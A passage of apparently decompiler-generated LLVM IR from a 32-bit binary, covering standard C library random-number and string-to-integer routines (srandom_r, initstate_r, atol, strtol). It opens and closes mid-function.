  %v1_8050e89 = add i32 %tmp2, 8
  %v2_8050e89 = inttoptr i32 %v1_8050e89 to i32*
  %v3_8050e89 = load i32, i32* %v2_8050e89, align 4
  store i32 %v3_8050e89, i32* %esi.global-to-local, align 4
  %v1_8050e8c = add i32 %tmp2, 12
  %v2_8050e8c = inttoptr i32 %v1_8050e8c to i32*
  %v3_8050e8c = load i32, i32* %v2_8050e8c, align 4
  %v4_8050e8c = icmp eq i32 %v3_8050e8c, 0
  %v1_8050e90 = icmp eq i1 %v4_8050e8c, false
  br i1 %v1_8050e90, label %dec_label_pc_8050ea9, label %dec_label_pc_8050e92

dec_label_pc_8050e92:                             ; preds = %entry
  %v2_8050e92 = inttoptr i32 %v3_8050e89 to i32*
  %v3_8050e92 = load i32, i32* %v2_8050e92, align 4
  %v5_8050e92 = mul i32 %v3_8050e92, 1103515245
  %v1_8050e98 = add i32 %v5_8050e92, 12345
  %v1_8050e9d = urem i32 %v1_8050e98, -2147483648
  store i32 %v1_8050e9d, i32* %eax.global-to-local, align 4
  store i32 %v1_8050e9d, i32* %v2_8050e92, align 4
  %v0_8050ea4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ea4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050ea4 = inttoptr i32 %v1_8050ea4 to i32*
  store i32 %v0_8050ea4, i32* %v2_8050ea4, align 4
  br label %dec_label_pc_8050ed5

dec_label_pc_8050ea9:                             ; preds = %entry
  %v1_8050ea9 = add i32 %tmp2, 4
  %v2_8050ea9 = inttoptr i32 %v1_8050ea9 to i32*
  %v3_8050ea9 = load i32, i32* %v2_8050ea9, align 4
  store i32 %v3_8050ea9, i32* %ecx.global-to-local, align 4
  %v2_8050eac = load i32, i32* %arg1, align 4
  store i32 %v2_8050eac, i32* %edx.global-to-local, align 4
  %v1_8050eae = add i32 %tmp2, 24
  %v2_8050eae = inttoptr i32 %v1_8050eae to i32*
  %v3_8050eae = load i32, i32* %v2_8050eae, align 4
  store i32 %v3_8050eae, i32* %edi.global-to-local, align 4
  %v1_8050eb1 = inttoptr i32 %v3_8050ea9 to i32*
  %v2_8050eb1 = load i32, i32* %v1_8050eb1, align 4
  store i32 %v2_8050eb1, i32* %eax.global-to-local, align 4
  %v1_8050eb3 = inttoptr i32 %v2_8050eac to i32*
  %v2_8050eb3 = load i32, i32* %v1_8050eb3, align 4
  %v4_8050eb3 = add i32 %v2_8050eb3, %v2_8050eb1
  store i32 %v4_8050eb3, i32* %v1_8050eb3, align 4
  %v0_8050eb5 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050eb5 = inttoptr i32 %v0_8050eb5 to i32*
  %v2_8050eb5 = load i32, i32* %v1_8050eb5, align 4
  %v1_8050eb7 = add i32 %v0_8050eb5, 4
  store i32 %v1_8050eb7, i32* %edx.global-to-local, align 4
  %v2_8050eba = udiv i32 %v2_8050eb5, 2
  %v1_8050ebc = load i32, i32* %edi.global-to-local, align 4
  %v7_8050ebc = icmp ult i32 %v1_8050eb7, %v1_8050ebc
  %v1_8050ebe = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050ebe = inttoptr i32 %v1_8050ebe to i32*
  store i32 %v2_8050eba, i32* %v2_8050ebe, align 4
  %v0_8050ec1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050ec1 = add i32 %v0_8050ec1, 4
  store i32 %v1_8050ec1, i32* %eax.global-to-local, align 4
  br i1 %v7_8050ebc, label %dec_label_pc_8050eca, label %dec_label_pc_8050ec6

dec_label_pc_8050ec6:                             ; preds = %dec_label_pc_8050ea9
  %v0_8050ec6 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050ec6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050ed0

dec_label_pc_8050eca:                             ; preds = %dec_label_pc_8050ea9
  %v1_8050eca = load i32, i32* %edi.global-to-local, align 4
  %v7_8050eca = icmp ult i32 %v1_8050ec1, %v1_8050eca
  br i1 %v7_8050eca, label %dec_label_pc_8050ed0, label %dec_label_pc_8050ece

dec_label_pc_8050ece:                             ; preds = %dec_label_pc_8050eca
  %v0_8050ece = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050ece, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ed0

dec_label_pc_8050ed0:                             ; preds = %dec_label_pc_8050eca, %dec_label_pc_8050ec6, %dec_label_pc_8050ece
  %v0_8050ed0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050ed0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050ed0 = inttoptr i32 %v1_8050ed0 to i32*
  store i32 %v0_8050ed0, i32* %v2_8050ed0, align 4
  %v0_8050ed2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ed2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050ed2 = add i32 %v1_8050ed2, 4
  %v3_8050ed2 = inttoptr i32 %v2_8050ed2 to i32*
  store i32 %v0_8050ed2, i32* %v3_8050ed2, align 4
  br label %dec_label_pc_8050ed5

dec_label_pc_8050ed5:                             ; preds = %dec_label_pc_8050e92, %dec_label_pc_8050ed0
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050ed7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050ed7, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8050e9d, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050ed5, { 1, 0 }
  uselistorder label %dec_label_pc_8050ed0, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8050edc = load i32, i32* @ebp, align 4
  %v0_8050edd = load i32, i32* @edi, align 4
  %v0_8050ede = load i32, i32* @esi, align 4
  %v0_8050edf = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_8050eea = trunc i64 %arg1 to i32
  store i32 %v4_8050eea, i32* %eax.global-to-local, align 4
  %v1_8050eee = add i32 %arg2, 12
  %v2_8050eee = inttoptr i32 %v1_8050eee to i32*
  %v3_8050eee = load i32, i32* %v2_8050eee, align 4
  store i32 %v3_8050eee, i32* %edx.global-to-local, align 4
  %v6_8050ef4 = icmp ugt i32 %v3_8050eee, 4
  br i1 %v6_8050ef4, label %dec_label_pc_8050f68, label %dec_label_pc_8050ef6

dec_label_pc_8050ef6:                             ; preds = %entry
  %v1_8050ef6 = add i32 %arg2, 8
  %v2_8050ef6 = inttoptr i32 %v1_8050ef6 to i32*
  %v3_8050ef6 = load i32, i32* %v2_8050ef6, align 4
  store i32 %v3_8050ef6, i32* %ebx.global-to-local, align 4
  %v1_8050ef9 = icmp eq i32 %v4_8050eea, 0
  %v1_8050efb = icmp eq i1 %v1_8050ef9, false
  br i1 %v1_8050efb, label %dec_label_pc_8050eff, label %dec_label_pc_8050efd

dec_label_pc_8050efd:                             ; preds = %dec_label_pc_8050ef6
  %v1_8050efd = and i32 %v4_8050eea, -256
  %v2_8050efd = or i32 %v1_8050efd, 1
  store i32 %v2_8050efd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050eff

dec_label_pc_8050eff:                             ; preds = %dec_label_pc_8050ef6, %dec_label_pc_8050efd
  %v0_8050eff = phi i32 [ %v4_8050eea, %dec_label_pc_8050ef6 ], [ %v2_8050efd, %dec_label_pc_8050efd ]
  %v2_8050eff = inttoptr i32 %v3_8050ef6 to i32*
  store i32 %v0_8050eff, i32* %v2_8050eff, align 4
  %v1_8050f01 = icmp eq i32 %v3_8050eee, 0
  br i1 %v1_8050f01, label %dec_label_pc_8050f66, label %dec_label_pc_8050f05

dec_label_pc_8050f05:                             ; preds = %dec_label_pc_8050eff
  %v0_8050f05 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050f05, i32* %edx.global-to-local, align 4
  %v0_8050f07 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050f07, i32* %ecx.global-to-local, align 4
  %v0_8050f09 = load i32, i32* @esi, align 4
  %v1_8050f09 = add i32 %v0_8050f09, 16
  %v2_8050f09 = inttoptr i32 %v1_8050f09 to i32*
  %v3_8050f09 = load i32, i32* %v2_8050f09, align 4
  store i32 %v3_8050f09, i32* %eax.global-to-local, align 4
  %v4_8050f11 = sext i32 %v3_8050f09 to i64
  store i64 %v4_8050f11, i64* %stack_var_-40, align 8
  %v5_8050f4327 = icmp sgt i32 %v3_8050f09, 1
  br i1 %v5_8050f4327, label %dec_label_pc_8050f16, label %dec_label_pc_8050f45

dec_label_pc_8050f16:                             ; preds = %dec_label_pc_8050f05, %dec_label_pc_8050f16.dec_label_pc_8050f16_crit_edge
  %v0_8050f3a = phi i32 [ %v0_8050f3a.pre, %dec_label_pc_8050f16.dec_label_pc_8050f16_crit_edge ], [ %v0_8050f07, %dec_label_pc_8050f05 ]
  %v0_8050f16 = phi i32 [ %v0_8050f16.pre, %dec_label_pc_8050f16.dec_label_pc_8050f16_crit_edge ], [ %v0_8050f05, %dec_label_pc_8050f05 ]
  %v0_8050f3d28 = phi i32 [ %v0_8050f40.pre, %dec_label_pc_8050f16.dec_label_pc_8050f16_crit_edge ], [ 1, %dec_label_pc_8050f05 ]
  %v1_8050f1d = ashr i32 %v0_8050f16, 31
  %v2_8050f1e = zext i32 %v0_8050f16 to i64
  %v4_8050f1e = zext i32 %v1_8050f1d to i64
  %v5_8050f1e = mul nuw i64 %v4_8050f1e, 4294967296
  %v6_8050f1e = or i64 %v5_8050f1e, %v2_8050f1e
  %v8_8050f1e = sdiv i64 %v6_8050f1e, 127773
  %v9_8050f1e = trunc i64 %v8_8050f1e to i32
  %v10_8050f1e = srem i64 %v6_8050f1e, 127773
  %v3_8050f24 = mul nsw i64 %v10_8050f1e, 16807
  %v4_8050f24 = trunc i64 %v3_8050f24 to i32
  %v3_8050f2a = mul i32 %v9_8050f1e, 2836
  store i32 %v3_8050f2a, i32* %eax.global-to-local, align 4
  %v2_8050f30 = sub i32 %v4_8050f24, %v3_8050f2a
  %v13_8050f30 = icmp slt i32 %v2_8050f30, 0
  %v1_8050f32 = icmp eq i1 %v13_8050f30, false
  %v1_8050f34 = add i32 %v2_8050f30, 2147483647
  %v2_8050f30.v1_8050f34 = select i1 %v1_8050f32, i32 %v2_8050f30, i32 %v1_8050f34
  store i32 %v2_8050f30.v1_8050f34, i32* %edx.global-to-local, align 4
  %v1_8050f3a = add i32 %v0_8050f3a, 4
  store i32 %v1_8050f3a, i32* %ecx.global-to-local, align 4
  %v1_8050f3d = add i32 %v0_8050f3d28, 1
  store i32 %v1_8050f3d, i32* @edi, align 4
  %v2_8050f3e = inttoptr i32 %v1_8050f3a to i32*
  store i32 %v2_8050f30.v1_8050f34, i32* %v2_8050f3e, align 4
  %v0_8050f40.pre = load i32, i32* @edi, align 4
  %v3_8050f40.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_8050f40.pre to i32
  %v5_8050f43 = icmp slt i32 %v0_8050f40.pre, %extract.t12
  br i1 %v5_8050f43, label %dec_label_pc_8050f16.dec_label_pc_8050f16_crit_edge, label %dec_label_pc_8050f40.dec_label_pc_8050f45_crit_edge

dec_label_pc_8050f16.dec_label_pc_8050f16_crit_edge: ; preds = %dec_label_pc_8050f16
  %v0_8050f16.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_8050f3a.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050f16

dec_label_pc_8050f40.dec_label_pc_8050f45_crit_edge: ; preds = %dec_label_pc_8050f16
  %v0_8050f45.pre = load i32, i32* @esi, align 4
  %v0_8050f48.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050f45

dec_label_pc_8050f45:                             ; preds = %dec_label_pc_8050f40.dec_label_pc_8050f45_crit_edge, %dec_label_pc_8050f05
  %v0_8050f48 = phi i32 [ %v0_8050f48.pre, %dec_label_pc_8050f40.dec_label_pc_8050f45_crit_edge ], [ %v0_8050f07, %dec_label_pc_8050f05 ]
  %v0_8050f45 = phi i32 [ %v0_8050f45.pre, %dec_label_pc_8050f40.dec_label_pc_8050f45_crit_edge ], [ %v0_8050f09, %dec_label_pc_8050f05 ]
  %v1_8050f45 = add i32 %v0_8050f45, 20
  %v2_8050f45 = inttoptr i32 %v1_8050f45 to i32*
  %v3_8050f45 = load i32, i32* %v2_8050f45, align 4
  store i32 %v3_8050f45, i32* %eax.global-to-local, align 4
  %v2_8050f48 = add i32 %v0_8050f45, 4
  %v3_8050f48 = inttoptr i32 %v2_8050f48 to i32*
  store i32 %v0_8050f48, i32* %v3_8050f48, align 4
  %v0_8050f4b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050f4b = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f4b = mul i32 %v1_8050f4b, 4
  %v3_8050f4b = add i32 %v2_8050f4b, %v0_8050f4b
  store i32 %v3_8050f4b, i32* %eax.global-to-local, align 4
  %v1_8050f4e = load i32, i32* @esi, align 4
  %v2_8050f4e = inttoptr i32 %v1_8050f4e to i32*
  store i32 %v3_8050f4b, i32* %v2_8050f4e, align 4
  %v3_8050f50 = load i64, i64* %stack_var_-40, align 8
  %v6_8050f50 = mul nsw i64 %v3_8050f50, 10
  %v7_8050f50 = trunc i64 %v6_8050f50 to i32
  %v2_8050f56 = ptrtoint i32* %stack_var_-20 to i32
  %v1_8050f6324 = add i32 %v7_8050f50, -1
  %v9_8050f6325 = icmp slt i32 %v1_8050f6324, 0
  store i32 %v1_8050f6324, i32* @ebx, align 4
  %v1_8050f6426 = icmp eq i1 %v9_8050f6325, false
  br i1 %v1_8050f6426, label %dec_label_pc_8050f56, label %dec_label_pc_8050f66

dec_label_pc_8050f56:                             ; preds = %dec_label_pc_8050f45, %dec_label_pc_8050f56
  store i32 %v2_8050f56, i32* %eax.global-to-local, align 4
  %v0_8050f5b = load i32, i32* @esi, align 4
  %v2_8050f5c = inttoptr i32 %v0_8050f5b to i32*
  %v3_8050f5c = call i32 @__GI_random_r(i32* %v2_8050f5c, i32 %v2_8050f56)
  store i32 %v0_8050f5b, i32* %eax.global-to-local, align 4
  store i32 %v2_8050f56, i32* %edx.global-to-local, align 4
  %v0_8050f63.pre = load i32, i32* @ebx, align 4
  %v1_8050f63 = add i32 %v0_8050f63.pre, -1
  %v9_8050f63 = icmp slt i32 %v1_8050f63, 0
  store i32 %v1_8050f63, i32* @ebx, align 4
  %v1_8050f64 = icmp eq i1 %v9_8050f63, false
  br i1 %v1_8050f64, label %dec_label_pc_8050f56, label %dec_label_pc_8050f66

dec_label_pc_8050f66:                             ; preds = %dec_label_pc_8050f45, %dec_label_pc_8050f56, %dec_label_pc_8050eff
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050f68

dec_label_pc_8050f68:                             ; preds = %entry, %dec_label_pc_8050f66
  %v0_8050f6b = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8050f66 ]
  store i32 %v0_8050f6b, i32* %eax.global-to-local, align 4
  store i32 %v0_8050edf, i32* @ebx, align 4
  store i32 %v0_8050ede, i32* @esi, align 4
  store i32 %v0_8050edd, i32* @edi, align 4
  store i32 %v0_8050edc, i32* @ebp, align 4
  ret i32 %v0_8050f6b

; uselistorder directives
  uselistorder i32 %v0_8050f6b, { 1, 0 }
  uselistorder i32 %v1_8050f63, { 1, 0 }
  uselistorder i32 %v0_8050f45, { 1, 0 }
  uselistorder i32 %v0_8050f40.pre, { 1, 0 }
  uselistorder i32 %v2_8050f30.v1_8050f34, { 1, 0 }
  uselistorder i32 %v0_8050f16, { 1, 0 }
  uselistorder i32 %v0_8050f07, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050f68, { 1, 0 }
  uselistorder label %dec_label_pc_8050f66, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050f56, { 1, 0 }
  uselistorder label %dec_label_pc_8050f16, { 1, 0 }
  uselistorder label %dec_label_pc_8050eff, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8050f75 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_8050f96, label %dec_label_pc_8050f8a

dec_label_pc_8050f8a:                             ; preds = %entry
  %v2_8050f8a = icmp ult i32 %arg3, 256
  %v1_8050f91 = select i1 %v2_8050f8a, i32 5, i32 4
  store i32 %v1_8050f91, i32* @ebx, align 4
  br label %dec_label_pc_8050fac

dec_label_pc_8050f96:                             ; preds = %entry
  %v6_8050f99 = icmp ugt i32 %arg3, 31
  br i1 %v6_8050f99, label %dec_label_pc_8050fa4, label %dec_label_pc_8050f9b

dec_label_pc_8050f9b:                             ; preds = %dec_label_pc_8050f96
  store i32 0, i32* @ebx, align 4
  %v6_8050fa0 = icmp ugt i32 %arg3, 7
  br i1 %v6_8050fa0, label %dec_label_pc_8050fac, label %dec_label_pc_8050ffc

dec_label_pc_8050fa4:                             ; preds = %dec_label_pc_8050f96
  %v2_8050fa4 = icmp ult i32 %arg3, 64
  %v1_8050fa9 = select i1 %v2_8050fa4, i32 3, i32 2
  store i32 %v1_8050fa9, i32* @ebx, align 4
  br label %dec_label_pc_8050fac

dec_label_pc_8050fac:                             ; preds = %dec_label_pc_8050f9b, %dec_label_pc_8050f8a, %dec_label_pc_8050fa4
  %v0_8050fac = phi i32 [ 0, %dec_label_pc_8050f9b ], [ %v1_8050f91, %dec_label_pc_8050f8a ], [ %v1_8050fa9, %dec_label_pc_8050fa4 ]
  %v1_8050fac = mul nuw nsw i32 %v0_8050fac, 4
  %v2_8050fac = add i32 %v1_8050fac, ptrtoint (i32* @global_var_80579f4.252 to i32)
  %v3_8050fac = inttoptr i32 %v2_8050fac to i32*
  %v4_8050fac = load i32, i32* %v3_8050fac, align 4
  store i32 %v4_8050fac, i32* %eax.global-to-local, align 4
  %v1_8050fb3 = add i32 %tmp7, 4
  store i32 %v1_8050fb3, i32* @esi, align 4
  %v2_8050fb6 = add i32 %arg4, 16
  %v3_8050fb6 = inttoptr i32 %v2_8050fb6 to i32*
  store i32 %v4_8050fac, i32* %v3_8050fb6, align 4
  %v0_8050fb9 = load i32, i32* @ebx, align 4
  %v1_8050fb9 = mul i32 %v0_8050fb9, 4
  %v2_8050fb9 = add i32 %v1_8050fb9, ptrtoint (i32* @global_var_80579e0.253 to i32)
  %v3_8050fb9 = inttoptr i32 %v2_8050fb9 to i32*
  %v4_8050fb9 = load i32, i32* %v3_8050fb9, align 4
  store i32 %v4_8050fb9, i32* %edx.global-to-local, align 4
  %v0_8050fc0 = load i32, i32* @esi, align 4
  %v1_8050fc0 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050fc0 = mul i32 %v1_8050fc0, 4
  %v3_8050fc0 = add i32 %v2_8050fc0, %v0_8050fc0
  store i32 %v3_8050fc0, i32* %eax.global-to-local, align 4
  %v1_8050fc3 = load i32, i32* @edi, align 4
  %v2_8050fc3 = add i32 %v1_8050fc3, 12
  %v3_8050fc3 = inttoptr i32 %v2_8050fc3 to i32*
  store i32 %v0_8050fb9, i32* %v3_8050fc3, align 4
  %v0_8050fc6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050fc6 = load i32, i32* @edi, align 4
  %v2_8050fc6 = add i32 %v1_8050fc6, 20
  %v3_8050fc6 = inttoptr i32 %v2_8050fc6 to i32*
  store i32 %v0_8050fc6, i32* %v3_8050fc6, align 4
  %v0_8050fc9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fc9 = load i32, i32* @edi, align 4
  %v2_8050fc9 = add i32 %v1_8050fc9, 24
  %v3_8050fc9 = inttoptr i32 %v2_8050fc9 to i32*
  store i32 %v0_8050fc9, i32* %v3_8050fc9, align 4
  %v0_8050fcc = load i32, i32* @esi, align 4
  %v1_8050fcc = load i32, i32* @edi, align 4
  %v2_8050fcc = add i32 %v1_8050fcc, 8
  %v3_8050fcc = inttoptr i32 %v2_8050fcc to i32*
  store i32 %v0_8050fcc, i32* %v3_8050fcc, align 4
  %v0_8050fcf = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8050fd4 = sext i32 %arg1 to i64
  %v3_8050fd4 = call i32 @srandom_r(i64 %v2_8050fd4, i32 %v0_8050fcf)
  %v0_8050fd9 = load i32, i32* @ebp, align 4
  %v1_8050fd9 = inttoptr i32 %v0_8050fd9 to i32*
  store i32 0, i32* %v1_8050fd9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050fe4 = load i32, i32* @ebx, align 4
  %v1_8050fe4 = icmp eq i32 %v0_8050fe4, 0
  br i1 %v1_8050fe4, label %dec_label_pc_8051015, label %dec_label_pc_8050fe8

dec_label_pc_8050fe8:                             ; preds = %dec_label_pc_8050fac
  %v0_8050fe8 = load i32, i32* @edi, align 4
  %v1_8050fe8 = add i32 %v0_8050fe8, 4
  %v2_8050fe8 = inttoptr i32 %v1_8050fe8 to i32*
  %v3_8050fe8 = load i32, i32* %v2_8050fe8, align 4
  %v1_8050feb = load i32, i32* @esi, align 4
  %v2_8050feb = sub i32 %v3_8050fe8, %v1_8050feb
  %v2_8050fed = sdiv i32 %v2_8050feb, 4
  %v3_8050ff0 = mul i32 %v2_8050fed, 5
  %v2_8050ff3 = add i32 %v3_8050ff0, %v0_8050fe4
  %v1_8050ff5 = load i32, i32* @ebp, align 4
  %v2_8050ff5 = inttoptr i32 %v1_8050ff5 to i32*
  store i32 %v2_8050ff3, i32* %v2_8050ff5, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051015

dec_label_pc_8050ffc:                             ; preds = %dec_label_pc_8050f9b
  %v1_8050ffc = call i32 @__errno_location(i32 %v0_8050f75)
  store i32 %v1_8050ffc, i32* %eax.global-to-local, align 4
  %v1_8051001 = inttoptr i32 %v1_8050ffc to i32*
  store i32 22, i32* %v1_8051001, align 4
  %v0_8051007 = load i32, i32* %stack_var_-36, align 4
  %v1_8051007 = call i32 @__errno_location(i32 %v0_8051007)
  %v1_805100c = inttoptr i32 %v1_8051007 to i32*
  store i32 22, i32* %v1_805100c, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051015

dec_label_pc_8051015:                             ; preds = %dec_label_pc_8050fac, %dec_label_pc_8050fe8, %dec_label_pc_8050ffc
  %v0_805101c = phi i32 [ 0, %dec_label_pc_8050fac ], [ 0, %dec_label_pc_8050fe8 ], [ -1, %dec_label_pc_8050ffc ]
  ret i32 %v0_805101c

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051015, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050fac, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805102b = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_805102b
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8051045 = inttoptr i32 %arg1 to i8*
  %v5_8051045 = call i32 @_stdlib_strto_l(i8* %v4_8051045, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8051045
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8051053 = load i32, i32* @ebx, align 4
  store i32 %v0_8051053, i32* %stack_var_-16, align 4
  %v0_8051057 = load i32, i32* @global_var_8059eb8, align 8
  %v4_805105d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805105d, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_805105d, i32* %ebx.global-to-local, align 4
  %v2_805106a41 = load i8, i8* %arg1, align 1
  %v3_805106a42 = sext i8 %v2_805106a41 to i32
  store i32 %v3_805106a42, i32* %eax.global-to-local, align 4
  %v2_805106d43 = mul nsw i32 %v3_805106a42, 2
  %v3_805106d44 = add i32 %v2_805106d43, %v0_8051057
  %v4_805106d45 = inttoptr i32 %v3_805106d44 to i8*
  %v5_805106d46 = load i8, i8* %v4_805106d45, align 1
  %v6_805106d47 = and i8 %v5_805106d46, 32
  %v7_805106d48 = icmp eq i8 %v6_805106d47, 0
  %v1_805107149 = icmp eq i1 %v7_805106d48, false
  br i1 %v1_805107149, label %dec_label_pc_8051069, label %dec_label_pc_8051073

dec_label_pc_8051069:                             ; preds = %entry, %dec_label_pc_8051069
  %v0_805106950 = phi i32 [ %v1_8051069, %dec_label_pc_8051069 ], [ %v4_805105d, %entry ]
  %v1_8051069 = add i32 %v0_805106950, 1
  store i32 %v1_8051069, i32* %ebx.global-to-local, align 4
  %v1_805106a = inttoptr i32 %v1_8051069 to i8*
  %v2_805106a = load i8, i8* %v1_805106a, align 1
  %v3_805106a = sext i8 %v2_805106a to i32
  store i32 %v3_805106a, i32* %eax.global-to-local, align 4
  %v2_805106d = mul nsw i32 %v3_805106a, 2
  %v3_805106d = add i32 %v2_805106d, %v0_8051057
  %v4_805106d = inttoptr i32 %v3_805106d to i8*
  %v5_805106d = load i8, i8* %v4_805106d, align 1
  %v6_805106d = and i8 %v5_805106d, 32
  %v7_805106d = icmp eq i8 %v6_805106d, 0
  %v1_8051071 = icmp eq i1 %v7_805106d, false
  br i1 %v1_8051071, label %dec_label_pc_8051069, label %dec_label_pc_8051073

dec_label_pc_8051073:                             ; preds = %dec_label_pc_8051069, %entry
  %v0_8051069.lcssa = phi i32 [ %v4_805105d, %entry ], [ %v1_8051069, %dec_label_pc_8051069 ]
  %v2_805106a.lcssa = phi i8 [ %v2_805106a41, %entry ], [ %v2_805106a, %dec_label_pc_8051069 ]
  %v3_805106a.lcssa = phi i32 [ %v3_805106a42, %entry ], [ %v3_805106a, %dec_label_pc_8051069 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8051073 = icmp eq i8 %v2_805106a.lcssa, 43
  br i1 %v9_8051073, label %dec_label_pc_8051088, label %dec_label_pc_8051078

dec_label_pc_8051078:                             ; preds = %dec_label_pc_8051073
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_805107a = icmp eq i8 %v2_805106a.lcssa, 45
  %v1_805107d = icmp eq i1 %v9_805107a, false
  br i1 %v1_805107d, label %dec_label_pc_8051089, label %dec_label_pc_8051088

dec_label_pc_8051088:                             ; preds = %dec_label_pc_8051073, %dec_label_pc_8051078
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8051078 ], [ 0, %dec_label_pc_8051073 ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_8051088 = add i32 %v0_8051069.lcssa, 1
  store i32 %v1_8051088, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051089

dec_label_pc_8051089:                             ; preds = %dec_label_pc_8051078, %dec_label_pc_8051088
  %v0_805109b = phi i32 [ %v0_8051069.lcssa, %dec_label_pc_8051078 ], [ %v1_8051088, %dec_label_pc_8051088 ]
  %v1_805108b = and i32 %arg3, -17
  %v2_805108b = icmp eq i32 %v1_805108b, 0
  %v1_8051091 = icmp eq i1 %v2_805108b, false
  br i1 %v1_8051091, label %dec_label_pc_80510b7, label %dec_label_pc_8051093

dec_label_pc_8051093:                             ; preds = %dec_label_pc_8051089
  %v1_8051093 = add i32 %arg3, 10
  store i32 %v1_8051093, i32* %esi.global-to-local, align 4
  %v1_8051096 = inttoptr i32 %v0_805109b to i8*
  %v2_8051096 = load i8, i8* %v1_8051096, align 1
  %v8_8051096 = icmp eq i8 %v2_8051096, 48
  %v1_8051099 = icmp eq i1 %v8_8051096, false
  br i1 %v1_8051099, label %dec_label_pc_80510ad, label %dec_label_pc_805109b

dec_label_pc_805109b:                             ; preds = %dec_label_pc_8051093
  %v1_805109b = add i32 %v0_805109b, 1
  store i32 %v1_805109b, i32* %ebx.global-to-local, align 4
  %v1_805109c = add i32 %arg3, 8
  store i32 %v1_805109c, i32* %esi.global-to-local, align 4
  %v1_80510a1 = inttoptr i32 %v1_805109b to i8*
  %v2_80510a1 = load i8, i8* %v1_80510a1, align 1
